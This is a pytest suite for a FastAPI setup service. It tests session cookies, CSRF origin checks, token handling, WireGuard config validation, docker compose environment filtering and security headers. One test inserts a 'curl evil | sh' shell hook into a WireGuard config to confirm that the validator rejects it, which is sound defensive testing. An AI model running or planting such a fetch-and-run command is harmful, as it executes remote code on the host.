"""Auth (CSRF, token compare, URL-token redirect), WG hook rejection and
atomic env-file writes. No docker daemon needed."""

import hashlib
import hmac
import os
import sys
import time

import pytest

os.environ.setdefault("SETUP_AUTH_TOKEN", "t" * 64)
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

pytest.importorskip("fastapi")
# Starlette's TestClient prefers httpx2 (the package requirements-dev.txt
# installs) and only falls back to httpx; skipping on a missing httpx alone
# would silently skip this whole suite in CI.
try:
    import httpx2  # noqa: F401
except ImportError:
    pytest.importorskip("httpx")

import main  # noqa: E402
from fastapi.testclient import TestClient  # noqa: E402

TOKEN = main._expected_token()
VALID_WG = """[Interface]
PrivateKey = AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=
Address    = 10.2.0.2/32
DNS        = 10.2.0.1

[Peer]
PublicKey  = WGPubKeyExample0000000000000000000000000000=
AllowedIPs = 0.0.0.0/0
Endpoint   = vpn.example.com:51820
"""


@pytest.fixture
def client():
    return TestClient(main.app, base_url="http://testserver")


@pytest.mark.parametrize("hook", ["PostUp", "PreUp", "PostDown", "PreDown", "postup"])
def test_wg_config_rejects_shell_hooks(hook):
    conf = VALID_WG.replace("[Peer]", f"{hook} = curl evil | sh\n\n[Peer]")
    errors = main._validate_wg_config(conf)
    assert any("disallowed key" in e for e in errors)


def test_wg_config_allows_comments_and_known_keys():
    conf = "# provider comment\n" + VALID_WG + "PersistentKeepalive = 25\n"
    assert main._validate_wg_config(conf) == []


def test_url_token_redirects_and_sets_cookie(client):
    r = client.get(f"/?token={TOKEN}", follow_redirects=False)
    assert r.status_code == 303
    assert r.headers["location"] == "/"
    assert main.SESSION_COOKIE in r.cookies


def test_non_ascii_token_is_401_not_500(client):
    assert client.get("/api/state", headers={"Authorization": "Bearer é".encode()}).status_code == 401
    assert client.get("/?token=%C3%A9").status_code == 401
    assert client.post("/auth", data={"token": "é"}).status_code == 401


def test_cookie_post_requires_same_origin(client):
    client.cookies.set(main.SESSION_COOKIE, main._make_session(TOKEN))
    # Cross-origin (e.g. the dashboard on :8080) — rejected before any write.
    r = client.post("/api/tunnel/1", data={"conf": "x"},
                    headers={"Origin": "http://testserver:8080"})
    assert r.status_code == 401
    # No Origin/Referer at all — rejected.
    r = client.post("/api/tunnel/1", data={"conf": "x"})
    assert r.status_code == 401
    # Same origin — passes auth, then fails validation on the bogus config.
    r = client.post("/api/tunnel/1", data={"conf": "x"},
                    headers={"Origin": "http://testserver"})
    assert r.status_code == 400


def _session_cookie(response) -> str:
    """The raw Set-Cookie header for the session cookie."""
    cookies = [c for c in response.headers.get_list("set-cookie")
               if c.startswith(main.SESSION_COOKIE + "=")]
    assert len(cookies) == 1, response.headers.get_list("set-cookie")
    return cookies[0]


def test_session_cookie_is_not_the_token(client):
    r = client.post("/auth", data={"token": TOKEN}, follow_redirects=False)
    assert r.status_code == 303
    header = _session_cookie(r)
    value = r.cookies[main.SESSION_COOKIE]
    assert TOKEN not in header
    ts, mac = value.split(".")
    assert abs(int(ts) - time.time()) < 60
    assert mac == hmac.new(TOKEN.encode(), f"dw-setup-session:{ts}".encode(),
                           hashlib.sha256).hexdigest()
    assert "max-age=43200" in header.lower()
    assert "httponly" in header.lower()
    # Plain http: no Secure, or the browser would never send it back.
    assert "secure" not in header.lower()
    # The issued cookie works on its own.
    fresh = TestClient(main.app, base_url="http://testserver")
    fresh.cookies.set(main.SESSION_COOKIE, value)
    assert fresh.get("/api/state").status_code == 200


def test_raw_token_cookie_is_rejected(client):
    # The pre-HMAC cookie format (the token itself) no longer authenticates.
    client.cookies.set(main.SESSION_COOKIE, TOKEN)
    assert client.get("/api/state").status_code == 401
    assert client.get("/").status_code == 401
    r = client.post("/api/tunnel/1", data={"conf": "x"},
                    headers={"Origin": "http://testserver"})
    assert r.status_code == 401


@pytest.mark.parametrize("cookie", [
    "", ".", "abc.def", "123", "123.", "١٢٣.abc", "9" * 5000 + ".abc",
])
def test_malformed_session_cookie_is_401(client, cookie):
    # Raw header: httpx refuses to encode the non-ASCII digits itself.
    header = f"{main.SESSION_COOKIE}={cookie}".encode()
    assert client.get("/api/state", headers={"Cookie": header}).status_code == 401


def test_expired_session_cookie_is_rejected(client):
    now = time.time()
    client.cookies.set(main.SESSION_COOKIE,
                       main._make_session(TOKEN, now - main.SESSION_MAX_AGE + 60))
    assert client.get("/api/state").status_code == 200
    client.cookies.set(main.SESSION_COOKIE,
                       main._make_session(TOKEN, now - main.SESSION_MAX_AGE - 60))
    assert client.get("/api/state").status_code == 401
    # A stamp from the future would outlive the 12 h window.
    client.cookies.set(main.SESSION_COOKIE, main._make_session(TOKEN, now + 3600))
    assert client.get("/api/state").status_code == 401


def test_rotated_token_revokes_session(client, tmp_path, monkeypatch):
    env = tmp_path / "env"
    env.write_text(f"SETUP_AUTH_TOKEN={TOKEN}\n")
    monkeypatch.setattr(main, "ENV_FILE", env)
    client.cookies.set(main.SESSION_COOKIE, main._make_session(TOKEN))
    assert client.get("/api/state").status_code == 200
    env.write_text("SETUP_AUTH_TOKEN=" + "r" * 64 + "\n")
    assert client.get("/api/state").status_code == 401
    assert client.get("/").status_code == 401


@pytest.mark.parametrize("headers,base_url", [
    ({"X-Forwarded-Proto": "https"}, "http://testserver"),
    ({"X-Forwarded-Proto": "HTTPS, http"}, "http://testserver"),
    ({}, "https://testserver"),
])
def test_https_session_cookie_is_secure(headers, base_url):
    c = TestClient(main.app, base_url=base_url)
    for r in (c.post("/auth", data={"token": TOKEN}, headers=headers,
                     follow_redirects=False),
              c.get(f"/?token={TOKEN}", headers=headers, follow_redirects=False)):
        assert r.status_code == 303
        assert "; secure" in _session_cookie(r).lower()


def test_failed_sign_in_logs_ip_not_value(client, caplog):
    attempt = "wrong-" + "x" * 40
    with caplog.at_level("WARNING", logger="setup"):
        r = client.post("/auth", data={"token": attempt})
    assert r.status_code == 401
    assert "failed sign-in from testclient" in caplog.text
    assert attempt not in caplog.text and "xxxx" not in caplog.text


@pytest.mark.parametrize("short", ["s" * 31, "abc", "zq"])
def test_short_token_is_401_everywhere(client, tmp_path, monkeypatch, caplog, short):
    env = tmp_path / "env"
    env.write_text(f"SETUP_AUTH_TOKEN={short}\n")
    monkeypatch.setattr(main, "ENV_FILE", env)
    monkeypatch.setattr(main, "_short_token_logged", False)
    # Must not reach the docker/compose helpers even if auth were bypassed.
    monkeypatch.setattr(main.subprocess, "run", None)
    bearer = {"Authorization": f"Bearer {short}"}
    with caplog.at_level("ERROR", logger="setup"):
        responses = [
            client.get("/"),
            client.get(f"/?token={short}", follow_redirects=False),
            client.get("/", headers=bearer),
            client.get("/api/state", headers=bearer),
            client.get(f"/api/state?token={short}"),
            client.post("/auth", data={"token": short}, follow_redirects=False),
            client.post("/api/tunnel/1", data={"conf": VALID_WG}, headers=bearer),
            client.post("/api/tunnel/2", data={"conf": VALID_WG}, headers=bearer),
            client.post("/api/telegram", data={"api_id": "123456",
                                               "api_hash": "a" * 32}, headers=bearer),
        ]
        # A session cookie minted with the short token is refused too.
        client.cookies.set(main.SESSION_COOKIE, main._make_session(short))
        responses += [
            client.get("/api/state"),
            client.post("/api/tunnel/1", data={"conf": VALID_WG},
                        headers={"Origin": "http://testserver"}),
        ]
    assert [r.status_code for r in responses] == [401] * len(responses)
    assert all(main.SESSION_COOKIE not in r.cookies for r in responses)
    assert env.read_text() == f"SETUP_AUTH_TOKEN={short}\n"
    # Logged once, not per request, and without the value.
    msgs = [r.getMessage() for r in caplog.records if "shorter than" in r.getMessage()]
    assert len(msgs) == 1, msgs
    assert short not in msgs[0]


def test_32_char_token_is_accepted(client, tmp_path, monkeypatch):
    token = "k" * 32
    env = tmp_path / "env"
    env.write_text(f"SETUP_AUTH_TOKEN={token}\n")
    monkeypatch.setattr(main, "ENV_FILE", env)
    assert client.get("/api/state",
                      headers={"Authorization": f"Bearer {token}"}).status_code == 200


def test_bearer_header_post_needs_no_origin(client):
    r = client.post("/api/tunnel/1", data={"conf": "x"},
                    headers={"Authorization": f"Bearer {TOKEN}"})
    assert r.status_code == 400


def test_update_env_is_atomic_and_private(tmp_path, monkeypatch):
    env = tmp_path / "env"
    env.write_text("# comment\nSETUP_AUTH_TOKEN=abc\nTELEGRAM_API_ID=\n")
    monkeypatch.setattr(main, "ENV_FILE", env)
    main._update_env({"TELEGRAM_API_ID": "123456", "NEW_VAR": "x"})
    assert env.read_text() == (
        "# comment\nSETUP_AUTH_TOKEN=abc\nTELEGRAM_API_ID=123456\nNEW_VAR=x\n"
    )
    assert oct(env.stat().st_mode & 0o777) == "0o600"
    assert not (tmp_path / "env.tmp").exists()


def test_cookie_post_behind_reverse_proxy(client):
    client.cookies.set(main.SESSION_COOKIE, main._make_session(TOKEN))
    # nginx default: Host rewritten to the upstream, public host in X-Forwarded-Host.
    r = client.post("/api/tunnel/1", data={"conf": "x"},
                    headers={"Origin": "https://setup.example.org",
                             "X-Forwarded-Host": "setup.example.org"})
    assert r.status_code == 400


@pytest.mark.parametrize("line", ["Table = off", "Table = 1234", "FwMark = 0x1"])
def test_wg_config_rejects_routing_overrides(line):
    # Table = off would stop wg0 being the default route (traffic would leave
    # via the Docker bridge); the kill switch relies on the default fwmark.
    conf = VALID_WG.replace("[Peer]", f"{line}\n\n[Peer]")
    assert any("disallowed key" in e for e in main._validate_wg_config(conf))


def test_wg_config_requires_full_tunnel():
    split = VALID_WG.replace("AllowedIPs = 0.0.0.0/0", "AllowedIPs = 10.0.0.0/8")
    assert any("0.0.0.0/0" in e for e in main._validate_wg_config(split))
    both = VALID_WG.replace("AllowedIPs = 0.0.0.0/0", "AllowedIPs = 0.0.0.0/0, ::/0")
    assert main._validate_wg_config(both) == []


def test_wg_config_requires_allowedips_line():
    # No AllowedIPs routes nothing through the tunnel; deploy.sh's
    # check_wg_conf rejects it too, so the Setup UI must not accept it.
    missing = VALID_WG.replace("AllowedIPs = 0.0.0.0/0\n", "")
    assert "AllowedIPs" not in missing
    assert any("AllowedIPs must include 0.0.0.0/0" in e
               for e in main._validate_wg_config(missing))


def test_telegram_save_never_validates_without_tunnel(client, tmp_path, monkeypatch):
    """No tunnel2 config -> creds are format-checked and saved, but Telegram
    is never contacted (it would be a direct connection from the host)."""
    called = []
    async def fake_validate(*a, **k):
        called.append(k.get("proxy")); return True, ""
    monkeypatch.setattr(main, "validate_telegram_credentials_async", fake_validate)
    monkeypatch.setattr(main, "TUNNEL2_CONF", tmp_path / "missing.conf")
    monkeypatch.setattr(main, "ENV_FILE", tmp_path / "env")
    (tmp_path / "env").write_text("SETUP_AUTH_TOKEN=" + TOKEN + "\n")
    monkeypatch.setattr(main, "_recreate_darkwatch", lambda: (True, "darkwatch"))
    r = client.post("/api/telegram", data={"api_id": "123456", "api_hash": "a" * 32},
                    headers={"Authorization": f"Bearer {TOKEN}"})
    assert r.status_code == 200, r.text
    assert called == []


def test_telegram_validation_uses_authenticated_proxy(client, tmp_path, monkeypatch):
    called = []
    async def fake_validate(*a, **k):
        called.append(k.get("proxy")); return True, ""
    conf = tmp_path / "wg0.conf"; conf.write_text(VALID_WG)
    monkeypatch.setattr(main, "validate_telegram_credentials_async", fake_validate)
    monkeypatch.setattr(main, "TUNNEL2_CONF", conf)
    monkeypatch.setattr(main, "ENV_FILE", tmp_path / "env")
    (tmp_path / "env").write_text(f"SETUP_AUTH_TOKEN={TOKEN}\nTG_SOCKS_PASSWORD=pw123\n")
    monkeypatch.setattr(main, "_recreate_darkwatch", lambda: (True, "darkwatch"))
    r = client.post("/api/telegram", data={"api_id": "123456", "api_hash": "a" * 32},
                    headers={"Authorization": f"Bearer {TOKEN}"})
    assert r.status_code == 200, r.text
    assert called == [("socks5", "tunnel2", 1080, True, "darkwatch", "pw123")]


class _FakeRun:
    """Stands in for subprocess.run; records each call's argv and env."""

    def __init__(self, inspect_rc=0, inspect_stderr=""):
        self.inspect_rc = inspect_rc
        self.inspect_stderr = inspect_stderr
        self.calls = []

    def __call__(self, cmd, **kwargs):
        self.calls.append((list(cmd), kwargs.get("env")))
        if cmd[:3] == ["docker", "image", "inspect"]:
            return main.subprocess.CompletedProcess(
                cmd, self.inspect_rc, stdout="", stderr=self.inspect_stderr)
        return main.subprocess.CompletedProcess(cmd, 0, stdout="", stderr="")


@pytest.fixture
def compose_tree(tmp_path, monkeypatch):
    repo = tmp_path / "repo"; repo.mkdir()
    (repo / "docker-compose.yml").write_text("services: {}\n")
    env = tmp_path / "env"; env.write_text(f"SETUP_AUTH_TOKEN={TOKEN}\n")
    secrets = tmp_path / "secrets"
    monkeypatch.setattr(main, "REPO_ROOT", repo)
    monkeypatch.setattr(main, "ENV_FILE", env)
    monkeypatch.setattr(main, "TUNNEL1_CONF", secrets / "tunnel1" / "wg_confs" / "wg0.conf")
    monkeypatch.setattr(main, "TUNNEL2_CONF", secrets / "tunnel2" / "wg_confs" / "wg0.conf")
    return tmp_path


def test_compose_env_drops_stale_container_env(compose_tree, monkeypatch):
    # setup's process env holds env-file values from when it was created;
    # compose would prefer them over the live --env-file.
    for key in ("TG_SOCKS_PASSWORD", "DARKWATCH_IP", "DARKNET_SUBNET",
                "DARKWATCH_BIND_IP", "TOR_CONTROL_PASSWORD", "TELEGRAM_API_HASH"):
        monkeypatch.setenv(key, "stale")
    monkeypatch.setenv("DOCKER_HOST", "unix:///var/run/docker.sock")
    monkeypatch.setenv("https_proxy", "http://proxy:3128")
    monkeypatch.setenv("LC_ALL", "C.UTF-8")
    fake = _FakeRun()
    monkeypatch.setattr(main.subprocess, "run", fake)

    assert main._recreate_darkwatch() == (True, "darkwatch")
    (cmd, env), = fake.calls
    assert cmd[:2] == ["docker", "compose"]
    for key in ("TG_SOCKS_PASSWORD", "DARKWATCH_IP", "DARKNET_SUBNET",
                "DARKWATCH_BIND_IP", "TOR_CONTROL_PASSWORD", "TELEGRAM_API_HASH",
                "SETUP_AUTH_TOKEN"):
        assert key not in env
    assert env["PATH"] == os.environ["PATH"]
    assert env["DOCKER_HOST"] == "unix:///var/run/docker.sock"
    assert env["https_proxy"] == "http://proxy:3128"
    assert env["LC_ALL"] == "C.UTF-8"
    assert env["DARKWEBAPP_DATA_ROOT"] == str(main.HOST_DATA_ROOT)
    assert env["DARKWATCH_HOST_REPO_ROOT"] == str(main.HOST_REPO_ROOT)


def test_tunnel1_save_without_tor_image_is_409_and_saved(client, compose_tree, monkeypatch):
    monkeypatch.setenv("TG_SOCKS_PASSWORD", "stale")
    fake = _FakeRun(inspect_rc=1, inspect_stderr=(
        f"Error response from daemon: No such image: {main.TOR_IMAGE}\n"))
    monkeypatch.setattr(main.subprocess, "run", fake)
    r = client.post("/api/tunnel/1", data={"conf": VALID_WG},
                    headers={"Authorization": f"Bearer {TOKEN}"})
    assert r.status_code == 409, r.text
    body = r.json()
    assert body["ok"] is False and body["saved"] is True
    assert "sudo ./ops/deploy.sh" in body["error"]
    assert main.TUNNEL1_CONF.read_text() == VALID_WG
    # Only the inspect ran (with the filtered env); compose never started.
    (cmd, env), = fake.calls
    assert cmd == ["docker", "image", "inspect", main.TOR_IMAGE]
    assert "TG_SOCKS_PASSWORD" not in env


@pytest.mark.parametrize("stderr", [
    "Cannot connect to the Docker daemon at unix:///var/run/docker.sock. "
    "Is the docker daemon running?\n",
    "permission denied while trying to connect to the Docker daemon socket "
    "at unix:///var/run/docker.sock\n",
])
def test_tunnel1_inspect_daemon_error_still_runs_compose(client, compose_tree,
                                                        monkeypatch, stderr):
    # Only "no such image" means the image is missing; a daemon error must
    # reach compose so its real error is shown, not "run deploy.sh".
    fake = _FakeRun(inspect_rc=1, inspect_stderr=stderr)
    monkeypatch.setattr(main.subprocess, "run", fake)
    r = client.post("/api/tunnel/1", data={"conf": VALID_WG},
                    headers={"Authorization": f"Bearer {TOKEN}"})
    assert r.status_code == 200, r.text
    compose = [cmd for cmd, _ in fake.calls if cmd[:2] == ["docker", "compose"]]
    assert compose and compose[0][-2:] == ["tunnel1", "tor"]


@pytest.mark.parametrize("n", [1, 2])
def test_tunnel_save_recreates_with_no_build(client, compose_tree, monkeypatch, n):
    fake = _FakeRun()
    monkeypatch.setattr(main.subprocess, "run", fake)
    r = client.post(f"/api/tunnel/{n}", data={"conf": VALID_WG},
                    headers={"Authorization": f"Bearer {TOKEN}"})
    assert r.status_code == 200, r.text
    compose = [cmd for cmd, _ in fake.calls if cmd[:2] == ["docker", "compose"]]
    assert len(compose) == 2
    assert all("--no-build" in cmd for cmd in compose)
    sidecar = "tor" if n == 1 else "tg-socks"
    assert compose[0][-2:] == [f"tunnel{n}", sidecar]
    inspects = [cmd for cmd, _ in fake.calls if cmd[:3] == ["docker", "image", "inspect"]]
    assert inspects == ([["docker", "image", "inspect", main.TOR_IMAGE]] if n == 1 else [])


def test_tor_image_name_matches_compose():
    compose = os.path.join(os.path.dirname(os.path.dirname(os.path.dirname(
        os.path.abspath(__file__)))), "docker-compose.yml")
    with open(compose) as f:
        assert f"image: {main.TOR_IMAGE}\n" in f.read()


def _assert_baseline_headers(r):
    assert r.headers["x-frame-options"] == "DENY"
    assert r.headers["content-security-policy"] == "frame-ancestors 'none'"
    assert r.headers["x-content-type-options"] == "nosniff"
    assert r.headers["referrer-policy"] == "same-origin"


def test_security_headers_and_no_store(client):
    # Login page, token redirect and an API error all carry the headers and
    # must not be cached (the redirect sets the session cookie).
    for r in (client.get("/"),
              client.get(f"/?token={TOKEN}", follow_redirects=False),
              client.get("/api/state")):
        _assert_baseline_headers(r)
        assert r.headers["cache-control"] == "no-store"


def test_static_files_keep_cacheable_headers(client):
    r = client.get("/static/style.css")
    assert r.status_code == 200
    _assert_baseline_headers(r)
    assert "no-store" not in r.headers.get("cache-control", "")
